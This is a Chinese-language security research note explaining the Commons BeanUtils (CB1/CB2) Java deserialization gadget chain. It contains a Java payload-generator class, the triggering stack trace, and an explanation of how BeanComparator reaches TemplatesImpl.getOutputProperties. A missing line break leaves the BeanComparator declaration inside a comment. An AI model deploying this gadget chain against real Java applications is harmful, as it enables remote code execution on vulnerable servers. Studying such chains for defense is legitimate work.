---
title: Commons BeanUtils反序列化
modDatetime: 2025-11-26T00:00:00.000+08:00
description: Commons BeanUtils 反序列化链 CB1 原理与利用记录
tags:
  - 反序列化
  - java
---

# CB1

就是CB2的弱化版本，使用默认的Comparator，依赖于CC

# CB2（或者叫CB）

## 利用条件

CB >= 1.5， 截止目前最新版1.11.0还是可以打

## payload

```java
package payloads;

import org.apache.commons.beanutils.BeanComparator;
import utils.MyObjectFactory;
import utils.Reflection;
import utils.Serializer;

import javax.xml.transform.Templates;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        Comparator comparator = (Comparator) Reflection.getInstanceByConstructor(Class.forName("java.lang.String$CaseInsensitiveComparator"), null, null);
// 初始化 BeanComparator        BeanComparator beanComparator = new BeanComparator("outputProperties", comparator);
        Templates templates = MyObjectFactory.getTemplatesImpl();
        PriorityQueue queue = new PriorityQueue(beanComparator);
        Object[] innerQueue = {templates, templates};
        Reflection.setFieldValue(queue, "queue", innerQueue);
        Reflection.setFieldValue(queue, "size", 2);
        Serializer.serialize(queue);
    }
}
```

## 堆栈

```txt
at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:507)
at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:498)
at org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(PropertyUtilsBean.java:2170)
at org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(PropertyUtilsBean.java:1332)
at org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(PropertyUtilsBean.java:770)
at org.apache.commons.beanutils.PropertyUtilsBean.getProperty(PropertyUtilsBean.java:846)
at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:426)
at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:157)
at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:722)
at java.util.PriorityQueue.siftDown(PriorityQueue.java:688)
at java.util.PriorityQueue.heapify(PriorityQueue.java:737)
at java.util.PriorityQueue.readObject(PriorityQueue.java:797)
```

## 原理

CB1.5版本引入了`BeanComparator`这个类。
BeanComparator的compare方法会调用对象指定属性的getter方法
![](assets/Commons%20BeanUtils反序列化/BeanComparator的compare方法.png)

指定属性为`outputProperties`， 对象为`templatesImpl`， 就可以在比较的时候调用`getOutputProperties`方法，从而实现字节码加载以及类实例化。

compare和CC2、4中一样，可以由`PriorityQueue`的`readObject`方法进入

需要注意的是，默认情况下BeanComparator的内部comparator是CC中的类，如果不另外指定Comparator会导致CB链同时需要依赖于CC。所以这里可以选用任意的JDK内置的comparator，比如`java.lang.String$CaseInsensitiveComparator`

![](assets/Commons%20BeanUtils反序列化/默认comparator.png)

## 启发

从上面可以发现，虽然BeanComparator中导入了CC的类，但是在没有CC依赖的情况下，如果没有使用到这个CC类，仍然可以正常的反序列化，不会报错类不存在。因为类是在被使用到的时候才加载，加载的时候才会报错找不到。

而编译的时候会检查import的类是否存在，所以CB编译的时候依赖于CC，运行时可以不依赖。pom中可以选择CC的scope为provided，不会被打包进CB依赖项。

## 修复方案

暂未被修复
